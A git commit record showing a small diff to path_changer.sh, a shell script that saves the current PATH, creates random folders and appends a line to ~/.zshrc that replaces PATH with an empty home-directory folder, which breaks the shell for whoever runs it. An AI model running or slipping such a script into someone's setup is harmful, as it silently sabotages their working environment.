20b29593a5b42743894b3ae0e29ce331fe148217
t0mmy-b <35820420+t0mmy-b@users.noreply.github.com>
2018-09-15 14:31:52 +0200

    Update path_changer.sh

--- path_changer.sh
+++ path_changer.sh
@@ -1,5 +1,5 @@
 SAVE_FOLDER=$(cat /dev/urandom | env LC_CTYPE=C tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
-NEW_PATH=$(cat /dev/urandom | env LC_CTYPE=C tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)/
+NEW_PATH=$(cat /dev/urandom | env LC_CTYPE=C tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
 mkdir ~/$SAVE_FOLDER ~/$NEW_PATH
 echo $PATH > $SAVE_FOLDER/PATH_SAVE
 echo 'export PATH=~/$NEW_PATH' >> ~/.zshrc
